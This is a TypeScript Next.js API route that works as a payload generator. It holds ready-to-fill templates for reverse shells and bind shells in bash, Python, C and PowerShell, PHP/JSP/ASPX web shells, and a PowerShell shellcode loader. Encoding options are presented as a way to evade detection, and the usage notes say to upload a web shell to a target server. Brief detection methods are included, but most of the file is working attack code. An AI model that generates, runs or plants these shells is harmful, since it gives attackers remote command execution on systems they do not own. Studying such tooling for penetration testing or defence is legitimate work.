import { NextRequest, NextResponse } from "next/server"

interface PayloadConfig {
  type: string
  platform: string
  encoding: string
  format: string
  target_ip?: string
  target_port?: number
  callback_ip?: string
  callback_port?: number
  custom_params?: Record<string, any>
}

interface GeneratedPayload {
  id: string
  type: string
  platform: string
  encoding: string
  format: string
  payload: string
  size: number
  description: string
  usage_notes: string[]
  evasion_techniques: string[]
  detection_methods: string[]
  references: string[]
  generated_at: string
}

// Payload templates
const PAYLOAD_TEMPLATES = {
  reverse_shell: {
    linux: {
      bash: `#!/bin/bash
# Reverse shell payload for Linux
exec 5<>/dev/tcp/{callback_ip}/{callback_port}
cat <&5 | while read line; do $line 2>&5 >&5; done`,
      python: `#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{callback_ip}", {callback_port}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])

if __name__ == "__main__":
    reverse_shell()`,
      c: `#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    char *server_ip = "{callback_ip}";
    int server_port = {callback_port};
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    inet_aton(server_ip, &server_addr.sin_addr);
    
    connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    execve("/bin/bash", NULL, NULL);
    return 0;
}`
    },
    windows: {
      powershell: `# PowerShell Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient("{callback_ip}",{callback_port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()`,
      python: `import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{callback_ip}", {callback_port}))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        result = output.stdout + output.stderr
        s.send(result.encode())
    
    s.close()

if __name__ == "__main__":
    reverse_shell()`
    }
  },
  bind_shell: {
    linux: {
      bash: `#!/bin/bash
# Bind shell payload for Linux
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l {target_port} > /tmp/f`,
      python: `#!/usr/bin/env python3
import socket
import subprocess
import threading

def handle_client(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode().strip()
            if command.lower() == 'exit':
                break
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
            client_socket.send(result.encode())
        except:
            break
    client_socket.close()

def bind_shell():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', {target_port}))
    server.listen(5)
    
    while True:
        client, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client,))
        client_thread.start()

if __name__ == "__main__":
    bind_shell()`
    },
    windows: {
      powershell: `# PowerShell Bind Shell
$listener = [System.Net.Sockets.TcpListener]::Create({target_port})
$listener.Start()
while ($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.WriteLine("PowerShell Bind Shell Ready")
    $writer.Flush()
    
    while ($client.Connected) {
        $writer.Write("PS> ")
        $writer.Flush()
        $command = $reader.ReadLine()
        if ($command -eq "exit") { break }
        try {
            $output = Invoke-Expression $command | Out-String
            $writer.WriteLine($output)
        } catch {
            $writer.WriteLine($_.Exception.Message)
        }
        $writer.Flush()
    }
    $client.Close()
}`
    }
  },
  web_shell: {
    web: {
      php: `<?php
// Simple PHP Web Shell
if(isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
} else {
    echo '<form method="post"><input type="text" name="cmd" placeholder="Enter command"><input type="submit" value="Execute"></form>';
}
?>`,
      jsp: `<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");
} else {
    out.println("<form><input type='text' name='cmd'><input type='submit' value='Execute'></form>");
}
%>`,
      aspx: `<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        string cmd = Request["cmd"];
        if (cmd != null) {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        } else {
            Response.Write("<form><input type='text' name='cmd'><input type='submit' value='Execute'></form>");
        }
    }
</script>`
    }
  },
  meterpreter: {
    windows: {
      powershell: `# Meterpreter PowerShell Payload
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
"@

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
[Byte[]]$sc = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00  # Meterpreter shellcode here
$size = 0x1000
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40)
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
$winFunc::CreateThread(0,0,$x,0,0,0)`,
      python: `#!/usr/bin/env python3
import socket
import struct
import threading
import time

def meterpreter_payload():
    # Meterpreter Python payload
    host = "{callback_ip}"
    port = {callback_port}
    
    def create_socket():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        return s
    
    def send_packet(s, data):
        s.send(struct.pack(">I", len(data)) + data)
    
    def recv_packet(s):
        length = struct.unpack(">I", s.recv(4))[0]
        return s.recv(length)
    
    s = create_socket()
    while True:
        try:
            packet = recv_packet(s)
            # Process meterpreter commands here
            response = b"Meterpreter response"
            send_packet(s, response)
        except:
            break
    
    s.close()

if __name__ == "__main__":
    meterpreter_payload()`
    }
  }
}

function applyEncoding(payload: string, encoding: string): string {
  switch (encoding) {
    case "base64":
      return Buffer.from(payload).toString('base64')
    case "url":
      return encodeURIComponent(payload)
    case "hex":
      return Buffer.from(payload).toString('hex')
    case "unicode":
      return payload.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('')
    case "xor":
      // Simple XOR with key 0x42
      return Array.from(Buffer.from(payload)).map(b => b ^ 0x42).map(b => b.toString(16).padStart(2, '0')).join('')
    default:
      return payload
  }
}

function formatPayload(template: string, config: PayloadConfig, encoding: string): string {
  let payload = template
  
  // Replace placeholders
  if (config.callback_ip) {
    payload = payload.replace(/{callback_ip}/g, config.callback_ip)
  }
  if (config.callback_port) {
    payload = payload.replace(/{callback_port}/g, config.callback_port.toString())
  }
  if (config.target_port) {
    payload = payload.replace(/{target_port}/g, config.target_port.toString())
  }
  if (config.custom_params?.command) {
    payload = payload.replace(/{custom_command}/g, config.custom_params.command)
  }
  
  // Apply encoding
  if (encoding !== "none") {
    payload = applyEncoding(payload, encoding)
  }
  
  return payload
}

function generatePayloadVariants(config: PayloadConfig): GeneratedPayload[] {
  const payloads: GeneratedPayload[] = []
  const templates = PAYLOAD_TEMPLATES[config.type as keyof typeof PAYLOAD_TEMPLATES]
  
  if (!templates) {
    return []
  }
  
  const platformTemplates = templates[config.platform as keyof typeof templates]
  if (!platformTemplates) {
    return []
  }
  
  Object.entries(platformTemplates).forEach(([format, template], index) => {
    if (config.format === "raw" || config.format === format) {
      const payload = formatPayload(template as string, config, config.encoding)
      
      payloads.push({
        id: `payload_${config.type}_${config.platform}_${format}_${index}`,
        type: config.type,
        platform: config.platform,
        encoding: config.encoding,
        format: format,
        payload: payload,
        size: payload.length,
        description: `${config.type.replace('_', ' ')} payload for ${config.platform} using ${format}`,
        usage_notes: getUsageNotes(config.type, config.platform, format),
        evasion_techniques: getEvasionTechniques(config.encoding, format),
        detection_methods: getDetectionMethods(config.type, format),
        references: getReferences(config.type, config.platform),
        generated_at: new Date().toISOString()
      })
    }
  })
  
  return payloads
}

function getUsageNotes(type: string, platform: string, format: string): string[] {
  const notes = [
    `This is a ${type.replace('_', ' ')} payload designed for ${platform} systems`,
    `Execute with appropriate ${format} interpreter or compiler`,
    `Ensure target system has necessary dependencies installed`
  ]
  
  if (type === "reverse_shell") {
    notes.push("Set up a listener before executing: nc -lvnp <port>")
    notes.push("Verify network connectivity between target and callback host")
  }
  
  if (type === "bind_shell") {
    notes.push("Connect to target after execution: nc <target_ip> <port>")
    notes.push("Ensure firewall allows inbound connections on specified port")
  }
  
  if (type === "web_shell") {
    notes.push("Upload to web-accessible directory on target server")
    notes.push("Access via web browser: http://target/shell.php?cmd=whoami")
  }
  
  return notes
}

function getEvasionTechniques(encoding: string, format: string): string[] {
  const techniques = []
  
  if (encoding === "base64") {
    techniques.push("Base64 encoding helps evade basic signature detection")
    techniques.push("Can be decoded at runtime to avoid static analysis")
  }
  
  if (encoding === "xor") {
    techniques.push("XOR encryption makes static analysis more difficult")
    techniques.push("Simple key rotation can further obfuscate payload")
  }
  
  if (format === "powershell") {
    techniques.push("PowerShell execution policy bypass techniques")
    techniques.push("In-memory execution avoids disk-based detection")
  }
  
  techniques.push("Variable payload size helps avoid size-based detection")
  techniques.push("Dynamic string construction can evade string matching")
  
  return techniques
}

function getDetectionMethods(type: string, format: string): string[] {
  const methods = [
    "Network traffic analysis for suspicious connections",
    "Process monitoring for unusual child processes",
    "Behavioral analysis of system calls and file operations"
  ]
  
  if (type === "reverse_shell") {
    methods.push("Outbound connection monitoring to unusual IPs/ports")
    methods.push("Detection of shell process spawning network connections")
  }
  
  if (type === "bind_shell") {
    methods.push("Port scanning detection for unexpected listening ports")
    methods.push("Firewall logs showing new inbound connections")
  }
  
  if (format === "powershell") {
    methods.push("PowerShell execution logging and script block logging")
    methods.push("AMSI (Anti-Malware Scan Interface) scanning")
  }
  
  return methods
}

function getReferences(type: string, platform: string): string[] {
  return [
    "https://attack.mitre.org/techniques/",
    "https://owasp.org/www-project-web-security-testing-guide/",
    "https://github.com/swisskyrepo/PayloadsAllTheThings",
    "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
  ]
}

export async function POST(request: NextRequest) {
  try {
    const config: PayloadConfig = await request.json()
    
    // Validate required fields
    if (!config.type || !config.platform || !config.encoding || !config.format) {
      return NextResponse.json(
        { error: "Type, platform, encoding, and format are required" },
        { status: 400 }
      )
    }
    
    // Validate payload type exists
    if (!PAYLOAD_TEMPLATES[config.type as keyof typeof PAYLOAD_TEMPLATES]) {
      return NextResponse.json(
        { error: "Unsupported payload type" },
        { status: 400 }
      )
    }
    
    // Simulate generation delay
    const generateStart = Date.now()
    await new Promise(resolve => setTimeout(resolve, 1000))
    const generationTime = Date.now() - generateStart
    
    const payloads = generatePayloadVariants(config)
    
    if (payloads.length === 0) {
      return NextResponse.json(
        { error: "No payloads could be generated for the specified configuration" },
        { status: 400 }
      )
    }
    
    const result = {
      config,
      payloads,
      total_generated: payloads.length,
      generation_time: generationTime,
      timestamp: new Date().toISOString()
    }
    
    return NextResponse.json(result)
    
  } catch (error) {
    console.error("Payload generation error:", error)
    return NextResponse.json(
      { error: "Failed to generate payloads" },
      { status: 500 }
    )
  }
}
